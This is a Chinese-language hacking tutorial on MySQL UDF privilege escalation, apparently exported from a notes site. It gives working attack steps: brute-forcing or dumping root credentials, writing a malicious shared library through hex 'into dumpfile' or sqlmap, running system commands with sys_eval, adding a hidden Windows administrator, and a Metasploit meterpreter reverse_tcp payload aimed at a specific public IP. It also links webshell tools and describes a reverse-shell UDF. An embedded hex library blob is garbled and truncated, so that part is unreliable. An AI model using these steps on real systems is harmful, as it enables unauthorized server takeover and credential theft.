**\nUDF提权是通过数据库来实现获取目标系统的管理员的shell，root，system。达到从低权限提权到高权限 \n\n^\n用户自定义函数，是数据库功能的一种扩展，用户通过自定义函数（动态链接库）实现mysql中无法方便实现的功能，其添加得新函数都可以在sql语句中调用，就像调用version()。\n\n## **提权条件**\n有了mysql高权限，如root用户。\n获取：\n1. 3306端口弱口令爆破。\n2. sqlmap 注入的 --sql-shell 模式。sqlmap查表拿到root明文拿去cmd5网站破译 --dump -C \"password\" -T user -D mysql。\n3. 网站的数据库配置文件中拿到明文密码信息。\n4. CVE-2012-2122 等这类漏洞直接拿下MYSQL权限。  \n5. phpmyadmin爆破登录。\n6. 必须能写文件。\n\n^\n## **不同版本动态链接库dll或so要写入的位置**\n查看版本：select version();\nMySQL < 5.0，mysql能检索的目录即可。\n5.0<=MySQL<5.1 ,需要导出至目标服务器的系统目录。（如：c\/windows\/system32\/）\nMySQL >= 5.1 ，必须放置于 MySQL 安装目录下的 lib\\plugin 文件夹下才能创建自定义函数\n^\nmysql配件位置：select @@plugin_dir;\n如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \\lib\\plugin\\文件夹：\nmysql安装目录位置：select @@basedir;\n\n普通linux中mysql：\/usr\/lib\/mysql\/plugin\/\n宝塔linux中mysql：\/www\/server\/mysql\/lib\/plugin\/\nwindows的phystudy中mysql：\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\\n^\n## **动态链接库dll或so文件来源**\nsqlmap中有（\/usr\/share\/sqlmap\/data\/udf\/），不过编码过so_，需要先解码成so\nMSF中的没有编码过直接可用 (根目录\/embedded\/framework\/data\/exploits\/mysql)\n或直接下载：<https:\/\/sqlsec.lanzoux.com\/i4b7jhyhwid>\n\n^\n## **写入和利用**\n**1.利用十六进制数据字符写入表在转化成dll：**\n获取udf.dll文件的十六进制hex值，这里存入txt。\n>可以使用工具提取，也可以直接使用mysql函数读转写文件（已知能读写）：\n    select hex(load_file(\"C:\/udf.dll\")) into dumpfile 'C:\/udf.txt'\n```\n登录目标机数据库，创建表:\nuse mysql;\ncreate table udf(c LONGBLOB)  \/\/创建udf表，c字段\n\n表中插入值这个十六进制串并hex解码：\ninsert into udf values(unhex('十六进制串'));\n\n查写入地址：\nselect @@plugin_dir;\n\n查这个表的结果通过into dumpfile 'xx\/lib\/plugin\/udf.dll'写入：\\的路径改为\/\nselect c from udf into dumpfile 'D:\/xxx\/udf.dll';\n```\n\n\n^\n**实际直接写十六进制串到目标文件也可以，上面作废。十六进制串：**<https:\/\/www.sqlsec.com\/tools\/udf.html>\n```\nselect 0x十六进制串 into dumpfile 'D:\/xxx\/udf.dll';\n```\n出现以下报错，把64换成32位的即可。\n```\nERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )\n```\n```\nSELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000 9c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000'));\n```\n\n^\n^\n**2.直接利用sqlmap的post传参将动态链接库文件写入mysql目录：**\nSQL 注入且是高权限，plugin 目录可写且需要 secure\\_file\\_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有**字节长度限制**，所以往往 POST 注入才可以执行这种攻击\n```\n--secure-file-priv = null  \/\/任何不可读写\n--secure-file-priv =        \/\/任何可读写\n--secure-file-priv = c:\\   \/\/只有C盘可读写\n在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径读写文件\n在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以读写文件\n查看配置：\nshow variables like '%secure%';\n```\nsqlmap写动态链接库\n```\nsqlmap -u \"http:\/\/localhost:30008\/\" --data=\"id=1\" \n--file-write=\"\/Users\/sec\/Desktop\/lib_mysqludf_sys_64.so\" \n--file-dest=\"\/usr\/lib\/mysql\/plugin\/udf.so\"\n```\n\n^\n**3.提权利用：**\n可以利用动态链接库里定义函数，使用可以操作系统shell的函数，且为最高权限system。\n```\nCREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; \/\/创建函数\n\nselect * from mysql.func; \/\/查看自定义的函数\ndrop function sys_eval; \/\/删除自定义函数\n\nselect sys_eval('whoami'); \/\/使用函数\nselect sys_eval('sudo ls \/root'); \n```\nwindows加用户并加入管理员组\n```\n创建一个用户hacker ,密码123456\nnet user hacker 123456 \/add\n\n将hacker用户加入管理员组，有远程登录权限。\nnet localgroup administrators hacker \/add\n`\n```\n\n^\n^\n## **MSF直接使用UDF模块**\n前提：mysql的root账号知道密码，开启了外链登录，可以写文件。\n```\n开启：\nGRANT ALL PRIVILEGES ON *.* TO '帐号'@'%'IDENTIFIED BY '密码' WITH GRANT OPTION;\n```\n使用MSF中的exploit\/multimysql\/mysql_udf_payload模块可以进行UDF提权，注入dll。\nMSF会将dll文件写入lib\\plugin\\目录下（前提是该目录存在，需手工创建），\n该dll文件中包含sys_exec(）和sys_eval(）两个函数，但是默认只创建sys_exec(）函数，该函数执行并不会有回显。\n我们可以手动创建sys_eval()函数，来执行有回显的命令。\nMSF:（前提mysql的root开启了外链）\n```\nuse exploit\/multi\/mysql\/mysql_udf_payload\nshow options\nset payload windows\/meterpreter\/reverse_tcp\nset username root\nset password root密码\nset rhosts 47.102.195.100\nrun\n```\nNavicat中：\n```\nMSF外链root导入dll后，再sql语句执行后续命令调用执行\nselect * from mysql.func where name=\"sys_exec\";\/\/查看自义定函数中有无sys_exec了，也可以看到绑定的dll名称\ncreate function sys_eval retums string soname \"WqkerHcA.dll\";\/\/创建函数sys_eval()绑定dll，dll名字随机需要手动查看或上一条命令查看。\nselect sys_eval(\"whoami\");\/调用函数进行命令执行\n```\n^\n^\n# **内网MySQL UDF提权**\n假设目标 MySQL 在内网情况下，已经开启了外链，无法直连 MySQL 或者 MySQL账号不允许外连，这个时候一些服务端本地网页脚本（本地localhost连接）就比较方便好用了。\n\n上传这个php程序到目标站点，登录内网mysql和一键UDF提权：<https:\/\/github.com\/echohun\/tools\/blob\/master\/%E5%A4%A7%E9%A9%AC\/udf.php>\n\n或者上传存在sql注入的datagear服务，java8启动，可以连接localhost，读数据，再用sqlmap提权。\n\n或者可执行文件如go程序可以配置连接本地数据库的。\n\n或者端口转发。\n\nHttp正向代理如ruo5，mudt也有http隧道功能。\n\n\n^\n^\n^\n# **UDF+反弹shell提权**\nUDF 提权的另一种用法，这里的动态链接库被定制过的，\n如上传动态链接库后，创建绑定函数，函数可以传入反弹的ip和端口作为参数，运行即可反弹shell，且这个shell为最高权限，实现提权。\n\n","meta":{"ctime":"2024-09-08T02:12:19+08:00","mtime":"2025-09-01T21:14:13+08:00"}},"options":{"poweredBy":{"name":"顶想云","link":"https:\/\/www.topthink.com"}}}
